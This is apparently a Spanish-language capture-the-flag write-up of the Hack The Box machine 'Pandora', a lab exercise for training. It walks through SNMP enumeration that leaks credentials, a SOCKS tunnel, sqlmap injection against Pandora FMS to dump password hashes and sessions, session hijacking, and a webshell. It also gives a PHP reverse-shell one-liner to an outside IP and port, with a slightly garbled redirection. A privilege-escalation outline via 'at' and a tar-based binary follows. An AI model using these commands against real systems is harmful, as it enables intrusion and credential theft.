---
title: Pandora HtB
published: True
---
# [](#header-1)Pandora HtB

## [](#header-2)Indice
- <a href="#introduccion">Introduccion</a>
- <a href="#desarrollo">Desarrollo</a>



Podemos observar que la maquina corre un servicio de snmpv1, el cual es usado para la administracion y monitoreo de la red. Y hasta la version 2 se mandan mensajes en texto limpio. Solamente la version 3 que es el mas reciente cuenta con encriptacion y autenticacion. SNMP almacena informacion en una estructura llamada MIB (Management Information Base). Esta es una estructura relacional que considera que informacion puede ser leida, escrita y accesible. Este utiliza identificadores OIDs. Pero esto nos es tan importante, solo es la informacion basica.

Para sacar informacion de la maquina que corre este servicio, la peticion se manda con un metodo GET a la maquina, con unstring para autentificarse el mismo. SNMP usa 2 strings diferentes llamados strings comunitarios, para autenticacion con maquinas. El string de solo lecturaes usualmente solo para informacion para lectura unicamente, y el atributo de lectura y escritura, son permisos para modificar alguna informacion. Lo importante de estos strings comunitarios, es que no pasan por ninguna encriptacion en hashes, son atomicos y faciles de crackear. Se utilizo esta <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt">lista</a> para encontrar los strings comunitarios de la maquina.

Despues de encontrar los strings comunitarios, se uso una herramienta llamada snmpwalk para enumerar toda la informacion que se pudo. 

```sc
snmpwalk -v 1 -c public panda.htb > snmpwalk-1.txt
```

Como podemos ver, se ha encontrado en texto plano un usuario y contrasena, asi que la usaremos para loggearnos por SSH en la maquina.

La flag de usuario esta en otro directorio de usuario, asi que buscaremos la manera de cambiar de usuario. El primer objetivo es **/var/www/html** y **/var/www/pandora**. El lado de html es visible para el publico, pero pandora es nuevo. Dentro del archivo /etc/hosts vemos unas asignaciones, asi que las usaremos como ventaja.

Si asumimos que estos hostnames entraran en el directorio de pandora, entonces necesitaremos establecer un tunel dinamico. Esto se puede hacer con:
```sc
ssh -D 9090 daniel@panda.htb
```
Usando este tunel, podemos ahora configurar un proxy para ver la pagina web.
Nota Estos deben ser SOCKS5 ya que este soporta resolucion de DNS.

Navegaremos a localhost.localdomain/pandora_console y nos mostrara una pagina para logearnos para algun software llamado pandora FMS. Para nustra suerte, existen muchos CVEs para este software, y este <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/">post</a> especificamente nos muestra que los parametros **chart_generator.php** files **session_id** son vulnerables. Para usar sqlmap para esto, necesitaremos antes una gran herramienta llamada proxychains. Proxichains esta disenada para hacer una cadena de proxies que te permiten usar tus herramientas en otras maquinas sin tener que instalarlas en el otro lado. Para usarlo necesitas especificar el tunel dinamico en el archivo /etc/proxychains4.conf

```sc
socks5 127.0.0.1 9090 daniel HotelBabylon23
```
Despues de configurarlo podemos ejecutar el ataque sqli contra el archivo generador de caracteres. 

```sc
proxychains sqlmap --url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables
``` 

La tabla en la que estamos interesados es **tpassword_history**. Despues de llegar a ella, obtenemos unas contrasenas con hashes para daniel y matt. Al ver los hashes, se puede ver que pueden ser MD5, o podemos utilizar la <a href="https://hashes.com/es/tools/hash_identifier">herramienta</a> para identificar que tipo de hashes se utilizaron.

```sc
proxychains sqlmap --url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" -Ttpassword_history --dump
``` 

Tambien en los id de sesiones de php que estan guardados en la tabla **tsessions_php** 

Ahora podemos copiar una de las sesiones de matt en el url y ver si funciona.

Y como lo mencionamos, esto nos trae al dashboard. Desafortunadamente a pesar de este <a href="https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py">CVE</a>, no se pudo establecer una shell. Pero si fue posible hacer algo con este  <a href="https://shells.systems/pandorafms-v7-0ng-authenticated-remote-code-execution-cve-2019-20224/">articulo</a> Asi que copie el URL y lo pegue para obtener mi cockie de admin, y funciono. Ahora que somos admin del FMS, termine en el archivo de administrador del dashboard.

Intente cargar un shell de php, pero no funciono. Asi que cargue una webshell y usandola para obtener una shell.

```sc
php -r '$sock=fsockopen("10.10.14.135",9602);exec("/bin/sh -i<&3>&32>&3");'
``` 
Hasta este punto, nos damos cuenta de que estamos en un ambiente restringido, ya que el comando sudo nos arrojo una respuesta extrana que se ha visto en otras maquinas. Asi que para seguir con esto hayq ue revisar los binarios para suid bits, y ahi encontraremos en **/usr/bin/at** cosas de sudo. Una vez con esto, podemos usar <a href="https://gtfobins.github.io/gtfobins/at/#sudo">el script de gtfobins</a> y nos permitira movernos a travez de la restriccion y asi poder navegar con una shell con privilegios elevados.

Cuando estaba intentando quitarme la restriccion , encontre un binario en /usr/bin llamado pandora_backup. Lo descargue a mi maquina e hice unas pruebas y al parecer utiliza el comando tar para comprimir archivos. Asi que cree un archivo tar malicioso y lo ejecute para ganar el privilegio de root.


